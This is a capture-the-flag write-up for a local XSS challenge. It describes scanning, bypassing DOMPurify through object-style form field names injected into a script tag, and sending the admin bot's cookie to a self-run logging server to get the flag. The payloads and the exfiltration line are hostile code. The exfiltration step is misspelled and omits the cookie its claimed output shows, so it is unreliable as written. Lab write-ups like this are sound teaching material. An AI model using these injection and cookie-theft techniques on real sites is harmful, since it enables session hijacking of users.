# Aboutify writeup

We follow the README, and get everything set up. Then we scan with `nmap localhost -Pn`

We should get something like this:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-01 11:47 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000080s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

3000, there is the server listening. On Opening http://localhost:3000/, we will be greeted with a form, that asks us to input our name with a aboutMe-page. We try inserting `<h1>isThisWorking?</h1><img src="/abc" onerror="alert(location.origin);" />`. We see the text "isThisWorking" in an h1, but we don't get a alert. On inspecting the sourcecode, we see, the onerror attribute was removed. Why? Because DOMPurify sanitized our evil html. Back on the homepage, we see the quote "fixed xss in /source" in a comment. On visiting /source, we will be greeted with the source file. The reviewing endpoint, gives us a hint, that clicking on the button "Show Alex" the headless browser visits the page, so we need to find a way to inject xss.

in /source we should have seen, that extended is set to true in the url-encoded bodyparsing. that means, we can pass objects, with x[y] = z in the headers. Using that, we can submit a aboutMe page with the headers name="a" and aboutMe[-alert('1')-]=+1, what gives us in the html-script tag following:

```js
DOMPurify.sanitize(""-alert('1')-":"+1);
```
so, we found succesfully a xss vulnerability.

Spin up a logging express server using
```js
const app = require("express")();app.get("*",(req,res)=>{console.log(req.url);res.send("")});app.listen(2000);
```
That will listen on port 2000 and log the urls. Set now the headers like that:
name=b
aboutMe[-fethc('http://localhost:2000/')-]=+1
and visit /u/b. Click on "Show Alex" and boom, you should see "/?cookie=CTF%7BCh3ck7yp3s%7D". Decode the address with anything, you want, for example node using
```js
new URL("http://localhost:2000/?cookie=CTF%7BCh3ck7yp3s%7D").searchParams.get("cookie");
```
It should give you `CTF{Ch3ck7yp3s}`.